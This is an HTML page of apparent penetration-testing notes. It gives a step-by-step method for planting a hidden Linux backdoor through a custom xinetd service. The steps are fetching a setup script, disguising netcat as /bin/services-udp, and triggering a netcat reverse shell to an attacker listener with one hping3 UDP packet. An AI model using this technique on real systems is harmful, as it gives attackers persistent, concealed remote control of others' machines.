<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>backdoor with xinetd daemon (Linux)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>backdoor with xinetd daemon (Linux)</h1><br/>Prerequisite:<br />• the target machine need xinetd installed<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:/</span>$ apt-get <span style="color:#ff9d00;font-weight:700">install</span> xinetd</pre></div><br />• root on the target machine<br /><br /><br /><strong>xinetd</strong> is a built-in daemon in Linux, which is used to manage network-based services on Linux systems.<br />Xinetd listens for incoming requests to ports we can define, and when a specific request is received, we can have it execute a command of our choosing.<br /><br />To create a backdoor, we will create a custom xinetd service, which listens on a UDP port which we can send a single UDP packet to.<br />Once that packet is received to the port we define, it will initiate a netcat reverse shell back to our attacker system.<br />We’re calling it a UDP <a href="https://en.wikipedia.org/wiki/Port_knocking">port-knock</a> backdoor because once we “knock” on our UDP port, it gives us an immediate reverse shell<br /><br />1. On the <span style="color:#1e90ff;">target machine</span>, we’re going to create a custom xinetd service with the bash script xinetd_server.sh. Run the script on the target host.<br />    The following script, when executed, will create a new xinetd service called “services-udp.” The “services-udp” custom service will be configured to listen on port <span style="color:#a020f0;">65534 UDP</span> on the target machine. It will also require that netcat (nc) is on the target host in the usual /bin/ directory. It will copy the nc executable to a file called “/bin/services-udp.” We’re obscuring netcat as another file in this case.<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>gist.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>anonymous<span style="color:#ff9d00;font-weight:700">/</span>3cb8e474b6bb3fd3787bda1e1a55cf56<span style="color:#ff9d00;font-weight:700">/</span>raw<span style="color:#ff9d00;font-weight:700">/</span>274621a090ba3b27eb9d7a1b86d33524f26a826e<span style="color:#ff9d00;font-weight:700">/</span>xinetd_server.sh<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># vim xinetd_server.sh</pre></div><br />    We have to edit <span style="color:#ff0000;">attacker_IP</span> and <span style="color:#ff0000;">attacker_PORT</span><br />    <a href=""><img src="images/1470-1.png" alt="images/1470-1.png" /></a><br />2. Download xinetd_server.sh to the <span style="color:#1e90ff;">target machine</span> from the <span style="color:#ff0000;">attacker machine</span><br />3. Execute xinetd_server.sh on the <span style="color:#1e90ff;">target machine</span><br />    <div class="codebox"><pre>root@debian<span style="color:#ff9d00;font-weight:700">:/</span>$ .<span style="color:#ff9d00;font-weight:700">/</span>xinetd_server.sh</pre></div>    <br />    We need to be root on the target machine<br />    <a href=""><img src="images/1470-2.png" alt="images/1470-2.png" /></a><br />4. Start listener on the <span style="color:#ff0000;">attacker</span>  with the same <span style="color:#ff0000;">&lt;attacker_PORT&gt;</span> you defined in the xinetd_server.sh script before running it.<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp &lt;attacker_PORT&gt;</pre></div><br />5. For the final step, we will use a tool called hping3 to send a single UDP packet to <span style="color:#a020f0;">port 65534</span> on the <span style="color:#1e90ff;">target host</span>, at which point, our custom “services-udp” netcat binary will be triggered, and send us a reverse shell. The hping command we will use is: <br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># hping3 -2 -c 1 &lt;target IP&gt; -p 65534</pre></div><br />    <a href=""><img src="images/1470-3.png" alt="images/1470-3.png" /></a><br />6. Now we should have received a reverse shell<br />    <a href=""><img src="images/1470-4.png" alt="images/1470-4.png" /></a></div>
</body>
</html>
